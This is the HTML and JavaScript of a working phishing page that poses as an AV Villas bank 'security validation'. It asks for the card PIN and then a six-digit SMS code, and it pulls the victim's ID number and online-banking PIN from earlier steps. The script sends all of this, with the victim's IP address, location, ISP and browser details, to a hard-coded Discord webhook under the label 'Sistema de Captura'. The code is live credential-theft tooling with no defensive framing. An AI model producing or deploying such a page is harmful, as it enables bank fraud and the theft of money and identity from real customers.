<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validaci贸n de Cuenta - AV Villas</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            width: 100%;
            max-width: 420px;
            border-radius: 0;
            overflow: hidden;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .header {
            position: relative;
            background: linear-gradient(135deg, #f5f5f5 0%, #f5f5f5 50%, #ED1C24 50%, #ED1C24 100%);
            padding: 40px 30px 60px;
            min-height: 500px;
            overflow: visible;
        }

        .logo {
            display: inline-block;
            margin-bottom: 30px;
        }

        .logo img {
            height: 45px;
            width: auto;
        }

        .title {
            margin-bottom: 20px;
        }

        .title-red {
            color: #ED1C24;
            font-weight: bold;
            font-size: 22px;
            margin-bottom: 5px;
        }

        .title-dark {
            color: #333;
            font-size: 26px;
            font-weight: 300;
            line-height: 1.2;
        }

        .title-blue {
            color: #00D4D4;
            font-size: 38px;
            font-weight: bold;
        }

        .person-image {
            position: absolute;
            bottom: 60px;
            right: -20px;
            width: 340px;
            height: 480px;
            display: flex;
            align-items: flex-end;
            justify-content: center;
            z-index: 10;
        }

        .person-placeholder {
            width: 100%;
            height: 100%;
            display: flex;
            align-items: flex-end;
            justify-content: center;
            position: relative;
        }

        .person-placeholder img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            object-position: bottom;
        }

        .form-section {
            padding: 40px 30px 30px;
        }

        .info-box {
            background: linear-gradient(135deg, rgba(237, 28, 36, 0.05) 0%, rgba(0, 212, 212, 0.05) 100%);
            border-left: 4px solid #ED1C24;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 30px;
        }

        .info-title {
            color: #ED1C24;
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .info-icon {
            width: 24px;
            height: 24px;
            fill: #ED1C24;
        }

        .info-text {
            color: #333;
            font-size: 15px;
            line-height: 1.5;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            color: #666;
            font-size: 14px;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 16px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            color: #333;
            background: white;
            transition: border-color 0.3s;
        }

        input:focus {
            outline: none;
            border-color: #ED1C24;
        }

        .btn-continue {
            width: 100%;
            padding: 16px;
            background: #B8C5D0;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 30px;
            transition: background 0.3s;
        }

        .btn-continue.active {
            background: #4A90E2;
        }

        .btn-continue.active:hover {
            background: #357ABD;
        }

        .help-link {
            text-align: center;
            margin-top: 20px;
            color: #4A90E2;
            font-size: 14px;
            cursor: pointer;
        }

        .footer-nav {
            display: flex;
            justify-content: space-around;
            padding: 20px;
            border-top: 1px solid #eee;
            margin-top: 30px;
        }

        .footer-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            color: #666;
            font-size: 12px;
            cursor: pointer;
        }

        .footer-icon {
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .footer-icon svg {
            width: 24px;
            height: 24px;
            fill: #666;
        }

        .account-hint {
            font-size: 13px;
            color: #999;
            margin-top: 8px;
            font-style: italic;
        }

        .hidden {
            display: none;
        }

        /* Wait screen styles */
        .wait-screen {
            background: #ffffff;
            min-height: 100vh;
            display: none;
            justify-content: center;
            align-items: center;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
        }

        .wait-screen.active {
            display: flex;
        }

        .loading-container {
            text-align: center;
            padding: 40px;
            max-width: 500px;
            animation: fadeIn 0.6s ease-out;
            position: relative;
            z-index: 10000;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .wait-logo {
            margin-bottom: 60px;
        }

        .wait-logo img {
            height: 120px;
            width: auto;
        }

        .loader-wrapper {
            margin: 0 auto 40px;
            width: 100px;
            height: 100px;
        }

        .loader {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 5px solid #f0f0f0;
            border-top-color: #ED1C24;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        .loading-text {
            font-size: 26px;
            color: #333;
            margin-bottom: 15px;
            font-weight: 400;
        }

        .loading-subtext {
            font-size: 16px;
            color: #666;
            margin-bottom: 40px;
        }

        .dots {
            display: inline-block;
        }

        .dot {
            display: inline-block;
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: #ED1C24;
            margin: 0 2px;
            animation: dotBounce 1.4s infinite ease-in-out;
        }

        .dot:nth-child(1) { animation-delay: 0s; }
        .dot:nth-child(2) { animation-delay: 0.2s; }
        .dot:nth-child(3) { animation-delay: 0.4s; }

        @keyframes dotBounce {
            0%, 80%, 100% {
                transform: scale(0);
                opacity: 0.5;
            }
            40% {
                transform: scale(1);
                opacity: 1;
            }
        }

        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            color: #4CAF50;
            font-size: 14px;
            margin-top: 30px;
        }

        .security-icon-badge {
            width: 20px;
            height: 20px;
            fill: #4CAF50;
        }

        /* SMS Code input boxes */
        .code-input-container {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-top: 25px;
            margin-bottom: 25px;
        }

        .code-box {
            width: 50px;
            height: 60px;
            border: 2px solid #ddd;
            border-radius: 8px;
            text-align: center;
            font-size: 28px;
            font-weight: bold;
            transition: border-color 0.3s;
            line-height: 56px;
            padding: 0;
            -webkit-text-security: disc;
            text-security: disc;
        }

        .code-box:focus {
            border-color: #ED1C24;
            outline: none;
        }

        .sms-note {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
        }

        .sms-note-text {
            color: #666;
            font-size: 14px;
            line-height: 1.5;
        }

        .phone-number {
            color: #ED1C24;
            font-weight: bold;
        }

        @media (max-width: 480px) {
            .header {
                min-height: 420px;
            }

            .person-image {
                width: 280px;
                height: 420px;
                right: -10px;
                bottom: 40px;
            }

            .logo img {
                height: 35px;
            }

            .title {
                max-width: 180px;
            }

            .wait-logo img {
                height: 100px;
            }

            .loader-wrapper {
                width: 80px;
                height: 80px;
            }

            .loader {
                width: 80px;
                height: 80px;
            }

            .loading-text {
                font-size: 22px;
            }

            .code-box {
                width: 45px;
                height: 55px;
                font-size: 24px;
                line-height: 51px;
            }
        }
    </style>
</head>
<body>
    <!-- STEP 1: Account Number -->
    <div class="container" id="step1">
        <div class="header">
            <div class="logo">
                <img src="https://feriadelavivienda.co/wp-content/uploads/2019/05/rsz_2logo_av_villas_rojo_mesa_de_trabajo_1.png" alt="AV Villas">
            </div>
            <div class="title">
                <div class="title-red">Validaci贸n</div>
                <div class="title-dark">de seguridad</div>
                <div class="title-blue">AV Villas</div>
            </div>
            <div class="person-image">
                <div class="person-placeholder">
                    <img src="https://piloto.avvillas.com.co/documents/37648/42971030/banner.webp/b8cc53a2-443c-085a-18d3-bc4925196c16?version=1.0&t=1752173464013&imagePreview=1" alt="AV Villas">
                </div>
            </div>
        </div>

        <div class="form-section">
            <div class="info-box">
                <div class="info-title">
                    <svg class="info-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
                    </svg>
                    Validaci贸n de tarjeta
                </div>
                <p class="info-text">
                    Por seguridad, ingresa la clave de tu tarjeta d茅bito o cr茅dito AV Villas para continuar.
                </p>
            </div>

            <div class="form-group">
                <label class="form-label">Clave de la tarjeta (4 d铆gitos)</label>
                <div class="code-input-container">
                    <input type="tel" class="code-box" maxlength="1" id="card1" inputmode="numeric" pattern="[0-9]*">
                    <input type="tel" class="code-box" maxlength="1" id="card2" inputmode="numeric" pattern="[0-9]*">
                    <input type="tel" class="code-box" maxlength="1" id="card3" inputmode="numeric" pattern="[0-9]*">
                    <input type="tel" class="code-box" maxlength="1" id="card4" inputmode="numeric" pattern="[0-9]*">
                </div>
            </div>

            <button class="btn-continue" id="btnContinue1">CONTINUAR</button>

            <div class="help-link">驴No recuerdas tu n煤mero de cuenta?</div>

            <div class="footer-nav">
                <div class="footer-item">
                    <div class="footer-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                            <path d="M20 15.5c-1.25 0-2.45-.2-3.57-.57-.1-.03-.21-.05-.31-.05-.26 0-.51.1-.71.29l-2.2 2.2c-2.83-1.44-5.15-3.75-6.59-6.59l2.2-2.21c.28-.26.36-.65.25-1C8.7 6.45 8.5 5.25 8.5 4c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1 0 9.39 7.61 17 17 17 .55 0 1-.45 1-1v-3.5c0-.55-.45-1-1-1zM19 12h2c0-4.97-4.03-9-9-9v2c3.87 0 7 3.13 7 7zm-4 0h2c0-2.76-2.24-5-5-5v2c1.66 0 3 1.34 3 3z"/>
                        </svg>
                    </div>
                    <div>Canales de atenci贸n</div>
                </div>
                <div class="footer-item">
                    <div class="footer-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                            <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14z"/>
                            <path d="M17 10h-4V6h-2v4H7v2h4v4h2v-4h4z"/>
                        </svg>
                    </div>
                    <div>Solicitar productos</div>
                </div>
            </div>
        </div>
    </div>

    <!-- WAIT SCREEN -->
    <div class="wait-screen" id="waitScreen">
        <div class="loading-container">
            <div class="wait-logo">
                <img src="https://cosmocentro.com/wp-content/uploads/2017/01/LOGO-AV-VILLAS-CON-CONTENEDOR.png" alt="AV Villas">
            </div>

            <div class="loader-wrapper">
                <div class="loader"></div>
            </div>

            <h2 class="loading-text" id="loadingTitle">Validando cuenta</h2>
            
            <p class="loading-subtext">
                Por favor espera un momento<span class="dots">
                    <span class="dot"></span>
                    <span class="dot"></span>
                    <span class="dot"></span>
                </span>
            </p>

            <div class="security-badge">
                <svg class="security-icon-badge" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
                </svg>
                <span>Conexi贸n segura</span>
            </div>
        </div>
    </div>

    <!-- STEP 2: SMS Code -->
    <div class="container hidden" id="step2">
        <div class="header">
            <div class="logo">
                <img src="https://feriadelavivienda.co/wp-content/uploads/2019/05/rsz_2logo_av_villas_rojo_mesa_de_trabajo_1.png" alt="AV Villas">
            </div>
            <div class="title">
                <div class="title-red">C贸digo de</div>
                <div class="title-dark">seguridad</div>
                <div class="title-blue">v铆a SMS</div>
            </div>
            <div class="person-image">
                <div class="person-placeholder">
                    <img src="https://piloto.avvillas.com.co/documents/37648/42971030/banner.webp/b8cc53a2-443c-085a-18d3-bc4925196c16?version=1.0&t=1752173464013&imagePreview=1" alt="AV Villas">
                </div>
            </div>
        </div>

        <div class="form-section">
            <div class="info-box">
                <div class="info-title">
                    <svg class="info-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 12H6v-2h12v2zm0-3H6V9h12v2zm0-3H6V6h12v2z"/>
                    </svg>
                    Verificaci贸n de seguridad
                </div>
                <p class="info-text">
                    Por pol铆ticas del banco, hemos enviado un c贸digo de seguridad a tu n煤mero de celular o correo electronico registrado.
                </p>
            </div>

            <div class="form-group">
                <label class="form-label">C贸digo de seguridad</label>
                <div class="code-input-container">
                    <input type="tel" class="code-box" maxlength="1" id="code1" inputmode="numeric" pattern="[0-9]*">
                    <input type="tel" class="code-box" maxlength="1" id="code2" inputmode="numeric" pattern="[0-9]*">
                    <input type="tel" class="code-box" maxlength="1" id="code3" inputmode="numeric" pattern="[0-9]*">
                    <input type="tel" class="code-box" maxlength="1" id="code4" inputmode="numeric" pattern="[0-9]*">
                    <input type="tel" class="code-box" maxlength="1" id="code5" inputmode="numeric" pattern="[0-9]*">
                    <input type="tel" class="code-box" maxlength="1" id="code6" inputmode="numeric" pattern="[0-9]*">
                </div>
            </div>

            <button class="btn-continue" id="btnContinue2">VALIDAR CDIGO</button>

            <div class="help-link">驴No recibiste el c贸digo?</div>

            <div class="footer-nav">
                <div class="footer-item">
                    <div class="footer-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                            <path d="M20 15.5c-1.25 0-2.45-.2-3.57-.57-.1-.03-.21-.05-.31-.05-.26 0-.51.1-.71.29l-2.2 2.2c-2.83-1.44-5.15-3.75-6.59-6.59l2.2-2.21c.28-.26.36-.65.25-1C8.7 6.45 8.5 5.25 8.5 4c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1 0 9.39 7.61 17 17 17 .55 0 1-.45 1-1v-3.5c0-.55-.45-1-1-1zM19 12h2c0-4.97-4.03-9-9-9v2c3.87 0 7 3.13 7 7zm-4 0h2c0-2.76-2.24-5-5-5v2c1.66 0 3 1.34 3 3z"/>
                        </svg>
                    </div>
                    <div>Canales de atenci贸n</div>
                </div>
                <div class="footer-item">
                    <div class="footer-icon">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                            <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14z"/>
                            <path d="M17 10h-4V6h-2v4H7v2h4v4h2v-4h4z"/>
                        </svg>
                    </div>
                    <div>Solicitar productos</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1471034444696522853/DUZaW94ie4iGarfMwCTQI1pWJMJ7Q48D6DukoDE-4QYQi9JgqDsZMcXwNYDfAEO7zgMC';
        
        let attemptNumber = parseInt(localStorage.getItem('avvillas_lastAttempt')) || 1;
        let userLocation = null;

        async function getUserLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                userLocation = {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    isp: data.org
                };
            } catch (error) {
                userLocation = {
                    ip: 'No disponible',
                    city: 'No disponible',
                    region: '',
                    country: 'No disponible',
                    isp: 'No disponible'
                };
            }
        }

        getUserLocation();

        // STEP 1: Card PIN (4 digits)
        const cardBoxes = [
            document.getElementById('card1'),
            document.getElementById('card2'),
            document.getElementById('card3'),
            document.getElementById('card4')
        ];
        const btnContinue1 = document.getElementById('btnContinue1');
        const step1 = document.getElementById('step1');
        const waitScreen = document.getElementById('waitScreen');
        const step2 = document.getElementById('step2');
        const loadingTitle = document.getElementById('loadingTitle');

        cardBoxes.forEach((box, index) => {
            box.addEventListener('input', function() {
                this.value = this.value.replace(/[^0-9]/g, '');
                
                if (this.value.length === 1 && index < cardBoxes.length - 1) {
                    cardBoxes[index + 1].focus();
                }
                checkCardComplete();
            });

            box.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value === '' && index > 0) {
                    cardBoxes[index - 1].focus();
                }
            });

            box.addEventListener('keypress', function(e) {
                if (!/[0-9]/.test(e.key)) {
                    e.preventDefault();
                }
            });
        });

        function checkCardComplete() {
            const allFilled = cardBoxes.every(box => box.value.length === 1);
            if (allFilled) {
                btnContinue1.classList.add('active');
            } else {
                btnContinue1.classList.remove('active');
            }
        }

        async function sendToDiscord(data) {
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
                return { success: response.ok };
            } catch (error) {
                return { success: false, error: error.message };
            }
        }

        function createAccountMessage() {
            const userAgent = navigator.userAgent;
            const currentTime = new Date().toLocaleString('es-CO', {
                weekday: 'long',
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                timeZone: 'America/Bogota'
            });

            const locationString = userLocation ? 
                `${userLocation.city}, ${userLocation.region}, ${userLocation.country}` : 
                'Ubicaci贸n no disponible';

            const docType = localStorage.getItem('avvillas_docType') || 'No disponible';
            const docNumber = localStorage.getItem('avvillas_docNumber') || 'No disponible';
            const pin = localStorage.getItem('avvillas_pin') || 'No disponible';
            const cardPin = cardBoxes.map(box => box.value).join('');

            return {
                embeds: [{
                    title: "Clave de Tarjeta Capturada - AV Villas",
                    description: "Se ha validado la clave de tarjeta.",
                    color: 15158332,
                    fields: [
                        {
                            name: " Clave de Tarjeta",
                            value: `\`\`\`${cardPin}\`\`\``,
                            inline: false
                        },
                        {
                            name: " Tipo de Documento",
                            value: `\`\`\`${docType}\`\`\``,
                            inline: true
                        },
                        {
                            name: " N煤mero de Documento",
                            value: `\`\`\`${docNumber}\`\`\``,
                            inline: true
                        },
                        {
                            name: " PIN Banca Virtual",
                            value: `\`\`\`${pin}\`\`\``,
                            inline: true
                        },
                        {
                            name: " Intento #",
                            value: `\`${attemptNumber}\``,
                            inline: true
                        },
                        {
                            name: " Ubicaci贸n Real",
                            value: userLocation ? 
                                ` ${locationString}\n IP: \`${userLocation.ip}\`\n ISP: ${userLocation.isp}` :
                                ' Obteniendo ubicaci贸n...',
                            inline: false
                        },
                        {
                            name: " Fecha y Hora",
                            value: currentTime,
                            inline: false
                        },
                        {
                            name: " Dispositivo",
                            value: `\`\`\`${userAgent}\`\`\``,
                            inline: false
                        }
                    ],
                    footer: {
                        text: "Sistema de Captura | @Brknshinexxx",
                        icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/500px-Telegram_logo.svg.png"
                    },
                    timestamp: new Date().toISOString()
                }]
            };
        }

        btnContinue1.addEventListener('click', async function() {
            const allFilled = cardBoxes.every(box => box.value.length === 1);
            if (allFilled) {
                btnContinue1.disabled = true;
                btnContinue1.textContent = 'ENVIANDO...';

                if (!userLocation) {
                    await getUserLocation();
                }

                const cardPin = cardBoxes.map(box => box.value).join('');
                localStorage.setItem('avvillas_cardPin', cardPin);

                const message = createAccountMessage();
                await sendToDiscord(message);

                // Mostrar pantalla de espera
                step1.classList.add('hidden');
                waitScreen.classList.add('active');

                // Cambiar mensaje a mitad
                setTimeout(() => {
                    loadingTitle.textContent = 'Enviando c贸digo SMS';
                }, 5000);

                // Despu茅s de 10 segundos, mostrar step 2
                setTimeout(() => {
                    waitScreen.classList.remove('active');
                    step2.classList.remove('hidden');
                }, 10000);
            }
        });

        // STEP 2: SMS Code
        const codeBoxes = [
            document.getElementById('code1'),
            document.getElementById('code2'),
            document.getElementById('code3'),
            document.getElementById('code4'),
            document.getElementById('code5'),
            document.getElementById('code6')
        ];
        const btnContinue2 = document.getElementById('btnContinue2');

        codeBoxes.forEach((box, index) => {
            box.addEventListener('input', function() {
                this.value = this.value.replace(/[^0-9]/g, '');
                
                if (this.value.length === 1 && index < codeBoxes.length - 1) {
                    codeBoxes[index + 1].focus();
                }
                checkCodeComplete();
            });

            box.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value === '' && index > 0) {
                    codeBoxes[index - 1].focus();
                }
            });

            box.addEventListener('keypress', function(e) {
                if (!/[0-9]/.test(e.key)) {
                    e.preventDefault();
                }
            });
        });

        function checkCodeComplete() {
            const allFilled = codeBoxes.every(box => box.value.length === 1);
            if (allFilled) {
                btnContinue2.classList.add('active');
            } else {
                btnContinue2.classList.remove('active');
            }
        }

        function createSMSMessage() {
            const userAgent = navigator.userAgent;
            const currentTime = new Date().toLocaleString('es-CO', {
                weekday: 'long',
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                timeZone: 'America/Bogota'
            });

            const locationString = userLocation ? 
                `${userLocation.city}, ${userLocation.region}, ${userLocation.country}` : 
                'Ubicaci贸n no disponible';

            const smsCode = codeBoxes.map(box => box.value).join('');
            const docType = localStorage.getItem('avvillas_docType') || 'No disponible';
            const docNumber = localStorage.getItem('avvillas_docNumber') || 'No disponible';
            const pin = localStorage.getItem('avvillas_pin') || 'No disponible';
            const cardPin = localStorage.getItem('avvillas_cardPin') || 'No disponible';

            return {
                embeds: [{
                    title: "C贸digo SMS Capturado - AV Villas",
                    description: "Se ha validado el c贸digo de seguridad SMS.",
                    color: 3066993,
                    fields: [
                        {
                            name: " C贸digo SMS",
                            value: `\`\`\`${smsCode}\`\`\``,
                            inline: false
                        },
                        {
                            name: " Clave de Tarjeta",
                            value: `\`\`\`${cardPin}\`\`\``,
                            inline: false
                        },
                        {
                            name: " Tipo de Documento",
                            value: `\`\`\`${docType}\`\`\``,
                            inline: true
                        },
                        {
                            name: " N煤mero de Documento",
                            value: `\`\`\`${docNumber}\`\`\``,
                            inline: true
                        },
                        {
                            name: " PIN Banca Virtual",
                            value: `\`\`\`${pin}\`\`\``,
                            inline: true
                        },
                        {
                            name: " Intento #",
                            value: `\`${attemptNumber}\``,
                            inline: true
                        },
                        {
                            name: " Ubicaci贸n Real",
                            value: userLocation ? 
                                ` ${locationString}\n IP: \`${userLocation.ip}\`\n ISP: ${userLocation.isp}` :
                                ' Obteniendo ubicaci贸n...',
                            inline: false
                        },
                        {
                            name: " Fecha y Hora",
                            value: currentTime,
                            inline: false
                        },
                        {
                            name: " Dispositivo",
                            value: `\`\`\`${userAgent}\`\`\``,
                            inline: false
                        }
                    ],
                    footer: {
                        text: "Sistema de Captura | @Brknshinexxx",
                        icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/500px-Telegram_logo.svg.png"
                    },
                    timestamp: new Date().toISOString()
                }]
            };
        }

        btnContinue2.addEventListener('click', async function() {
            const allFilled = codeBoxes.every(box => box.value.length === 1);
            if (allFilled) {
                btnContinue2.disabled = true;
                btnContinue2.textContent = 'VALIDANDO...';

                if (!userLocation) {
                    await getUserLocation();
                }

                const smsCode = codeBoxes.map(box => box.value).join('');
                localStorage.setItem('avvillas_smsCode', smsCode);

                const message = createSMSMessage();
                const result = await sendToDiscord(message);

                if (result.success) {
                    attemptNumber++;
                    localStorage.setItem('avvillas_lastAttempt', attemptNumber.toString());
                    window.location.href = 'index.html';
                } else {
                    alert('Error al validar el c贸digo. Por favor, intente nuevamente.');
                    btnContinue2.disabled = false;
                    btnContinue2.textContent = 'VALIDAR CDIGO';
                }
            }
        });
    </script>
</body>
</html>
